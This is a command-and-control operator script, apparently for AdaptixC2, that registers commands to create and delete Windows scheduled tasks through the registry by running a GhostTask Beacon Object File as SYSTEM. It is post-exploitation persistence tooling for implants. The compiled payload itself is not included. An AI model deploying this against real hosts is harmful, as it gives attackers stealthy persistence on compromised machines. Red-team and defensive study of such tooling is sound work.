var metadata = {
    name: "GhostTask-BOF",
    description: "Create/delete scheduled tasks via registry"
};

// ── Subcomando: add ──────────────────────────────────────────
var cmd_ghost_add = ax.create_command(
    "ghost_task_add",
    "Create a scheduled task through the registry (local, requiere SYSTEM)."
);
cmd_ghost_add.addArgFlagString("-n", "taskname",  "Name of scheduled task");
cmd_ghost_add.addArgFlagString("-p", "program",   "Executable Path");
cmd_ghost_add.addArgFlagString("-s", "stype",     "Trigger: second | daily | weekly | logon");
cmd_ghost_add.addArgFlagString("-t", "time",      "HH:MM (daily/weekly) -- second", "0");
cmd_ghost_add.addArgFlagString("-u", "username",  "Username", "SYSTEM");
cmd_ghost_add.addArgFlagString("-a", "argument",  "", "");
cmd_ghost_add.addArgFlagString("-d", "days",      "Days (ex: monday,friday)", "monday");

cmd_ghost_add.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    var taskname = parsed_json["taskname"] || "";
    var program  = parsed_json["program"]  || "";
    var stype    = parsed_json["stype"]    || "";
    var time_val = parsed_json["time"]     || "0";
    var username = parsed_json["username"] || "SYSTEM";
    var argument = parsed_json["argument"] || "";
    var days     = parsed_json["days"]     || "monday";

    if (!taskname) { ax.console_message(id, "Falta -n <taskname>", "error"); return; }
    if (!program)  { ax.console_message(id, "Falta -p <program>",  "error"); return; }
    if (!stype)    { ax.console_message(id, "Falta -s <stype>: second | daily | weekly | logon", "error"); return; }

    var stype_lower = stype.toLowerCase();
    var pack_types, pack_args;

    if (stype_lower === "weekly") {
        pack_types = "int,cstr,cstr,cstr,cstr,cstr,cstr,cstr,cstr";
        pack_args  = [9, "add", taskname, program, argument, username, stype, time_val, days];
    } else if (stype_lower === "logon") {
        pack_types = "int,cstr,cstr,cstr,cstr,cstr,cstr";
        pack_args  = [7, "add", taskname, program, argument, username, stype];
    } else {
        // second o daily
        pack_types = "int,cstr,cstr,cstr,cstr,cstr,cstr,cstr";
        pack_args  = [8, "add", taskname, program, argument, username, stype, time_val];
    }

    var bof_params = ax.bof_pack(pack_types, pack_args);
    var bof_path   = ax.script_dir() + "_bin/GhostTask." + ax.arch(id) + ".o";

    if (!ax.file_exists(bof_path)) {
        ax.console_message(id, "BOF no encontrado: " + bof_path, "error");
        return;
    }

    ax.execute_alias(id, cmdline,
        "execute bof " + bof_path + " " + bof_params,
        "Task: GhostTask add [" + taskname + "]", null);
});

// ── Subcomando: delete ───────────────────────────────────────
var cmd_ghost_delete = ax.create_command(
    "ghost_task_delete",
    "Deletes a scheduled task from the local registry (requires SYSTEM).\n"
);
cmd_ghost_delete.addArgFlagString("-n", "taskname", "Name of the task to delete");

cmd_ghost_delete.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    var taskname = parsed_json["taskname"] || "";

    if (!taskname) { ax.console_message(id, "Falta -n <taskname>", "error"); return; }

    var bof_params = ax.bof_pack("int,cstr,cstr", [3, "delete", taskname]);
    var bof_path   = ax.script_dir() + "_bin/GhostTask." + ax.arch(id) + ".o";

    if (!ax.file_exists(bof_path)) {
        ax.console_message(id, "BOF no encontrado: " + bof_path, "error");
        return;
    }

    ax.execute_alias(id, cmdline,
        "execute bof " + bof_path + " " + bof_params,
        "Task: GhostTask delete [" + taskname + "]", null);
});

// ── Registrar grupo ──────────────────────────────────────────
var group_ghost = ax.create_commands_group("GhostTask-BOF", [
    cmd_ghost_add,
    cmd_ghost_delete
]);
ax.register_commands_group(group_ghost, ["beacon", "gopher"], ["windows"], []);

ax.log("[GhostTask] Script cargado. Comandos: ghost_task_add | ghost_task_delete");
